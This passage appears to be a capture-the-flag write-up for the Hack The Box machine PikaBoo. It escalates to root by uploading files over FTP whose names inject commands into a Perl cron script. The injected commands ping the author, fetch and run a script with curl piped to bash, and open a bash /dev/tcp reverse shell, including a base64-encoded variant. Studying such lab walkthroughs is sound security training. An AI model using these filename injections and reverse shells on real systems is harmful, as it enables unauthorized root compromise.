+<p>I’ll create a local empty file, <code class="language-plaintext highlighter-rouge">test.txt</code> to upload. pwnmeow doesn’t have permissions to write to the root of FTP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt;</span><span class="w"> </span>put test.txt
+<span class="go">local: test.txt remote: test.txt
+200 PORT command successful. Consider using PASV.
+553 Could not create file.
+</span></code></pre></div></div>
+<p>However, the permissions in the <code class="language-plaintext highlighter-rouge">ls</code> above show that as members of the ftp group can write to them, and pwnmeow is in that group:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pikaboo:/var/www$</span><span class="w"> </span><span class="nb">grep </span>ftp /etc/group
+<span class="go">ftp:x:115:pwnmeow
+</span></code></pre></div></div>
+<p>I’ll pick a directory at random and upload a file. It works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">cd </span>types
+<span class="go">250 Directory successfully changed.
+</span><span class="gp">ftp&gt;</span><span class="w"> </span>put test.txt
+<span class="go">local: test.txt remote: test.txt
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+</span></code></pre></div></div>
+<h3 id="exploit-cvsupdate">Exploit cvsupdate</h3>
+<h4 id="local-example">Local Example</h4>
+<p>Perl’s <code class="language-plaintext highlighter-rouge">open</code> command can, for some crazy reason, be used to execute code. If a command starts with <code class="language-plaintext highlighter-rouge">|</code>, then the rest of the command will be executed, with anything written to the resulting handle being passed to the executed command’s STDIN. If the filename ends with <code class="language-plaintext highlighter-rouge">|</code>, then the stuff before is executed, and the output of the execution can be read from the filehandle.</p>
+<p>I’ll demonstrate with a silly Perl program that is similar to the one on PikaBoo:</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/perl</span>
+
+
+<span class="nb">shift</span><span class="p">;</span>
+<span class="k">for</span><span class="p">(</span><span class="o">&lt;&gt;</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">print</span> <span class="vg">$_</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>I’ll create a couple of <code class="language-plaintext highlighter-rouge">.csv</code> files and run it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"1</span><span class="se">\n</span><span class="s2">2</span><span class="se">\n</span><span class="s2">3"</span> <span class="o">&gt;</span> a.csv 
+<span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"a</span><span class="se">\n</span><span class="s2">b"</span> <span class="o">&gt;</span> b.csv 
+<span class="gp">oxdf@parrot$</span><span class="w"> </span>perl test.pl ignore <span class="k">*</span>.csv
+<span class="go">1
+2
+3
+a
+b
+</span></code></pre></div></div>
+<p>I’ll add a file that has a command injection name:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">touch</span> <span class="s1">'|id; #.csv'</span>
+</code></pre></div></div>
+<p>It runs the command:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>perl test.pl ignore <span class="k">*</span>.csv
+<span class="go">uid=1000(oxdf) gid=1000(oxdf) groups=1000(oxdf),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(debian-tor),124(bluetooth),140(scanner),153(docker),998(vboxsf)
+1
+2
+3
+a
+b
+</span></code></pre></div></div>
+<p>All of this is to show that if I can write into these directories (and create a file with a name like this), I’ll have execution as root.</p>
+<h4 id="poc-on-pikaboo">POC on PikaBoo</h4>
+<p>I’ll use FTP to upload the empty <code class="language-plaintext highlighter-rouge">text.txt</code> file, but change the name to something that will <code class="language-plaintext highlighter-rouge">ping</code> me if it executes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt;</span><span class="w"> </span>put test.txt <span class="s2">"|ping -c 1 10.10.14.6; a.csv"</span>
+<span class="go">local: test.txt remote: |ping -c 1 10.10.14.6; a.csv
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+</span></code></pre></div></div>
+<p>When the minute rolls over, I get ICMP packets:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> tun0 icmp
+<span class="go">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+16:20:05.293445 IP 10.10.10.249 &gt; 10.10.14.6: ICMP echo request, id 25701, seq 1, length 64
+16:20:05.293486 IP 10.10.14.6 &gt; 10.10.10.249: ICMP echo reply, id 25701, seq 1, length 64
+</span></code></pre></div></div>
+<h4 id="shell-1">Shell</h4>
+<p>The challenge here is that I have to put everything I want to do in one line, and it can’t contain <code class="language-plaintext highlighter-rouge">/</code>. That means I can’t call a script in another directory, or directly do a reverse shell as they all contain <code class="language-plaintext highlighter-rouge">/</code>. I found two ways to do this (there are probably more).</p>
+<p>One is to create a rev shell Bash script on my host and request it with <code class="language-plaintext highlighter-rouge">curl</code> and pipe it into <code class="language-plaintext highlighter-rouge">bash</code>. The only trick is I can’t use <code class="language-plaintext highlighter-rouge">/</code>, so I just need to make it the index file. On my host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">cat </span>index.html 
+<span class="c">#!/bin/bash
+</span><span class="go">
+bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</span></code></pre></div></div>
+<p>Now I’ll upload the file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt;</span><span class="w"> </span>put test.txt <span class="s2">"|curl 10.10.14.6|bash; a.csv"</span>
+<span class="go">local: test.txt remote: |curl 10.10.14.6|bash; a.csv
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+</span></code></pre></div></div>
+<p>When the cron runs, I get the request:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.249 - - [07/Jul/2021 16:31:04] "GET / HTTP/1.1" 200 -
+</code></pre></div></div>
+<p>And then the shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.249] 49596
+bash: cannot set terminal process group (30460): Inappropriate ioctl for device
+bash: no job control in this shell
+root@pikaboo:/srv/ftp/types#
+</span></code></pre></div></div>
+<p>Alternatively, I could just base64 encode the command I want to run:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1'</span> | <span class="nb">base64</span>
+<span class="go">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==
+</span></code></pre></div></div>
+<p>I’ll use that to create the filename:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt;</span><span class="w"> </span>put test.txt <span class="s2">"|echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==|base64 -d|bash; a.csv"</span>
+<span class="go">local: test.txt remote: |echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==|base64 -d|bash; a.csv
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+</span></code></pre></div></div>
+<p>It also returns a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.249] 49602
+bash: cannot set terminal process group (2772): Inappropriate ioctl for device
+bash: no job control in this shell
+root@pikaboo:/srv/ftp/types# 
+</span></code></pre></div></div>
+<p>Either way, I can grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@pikaboo:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">3a9a1e35************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2021/12/04/htb-pikaboo.html"></a>
+</article>
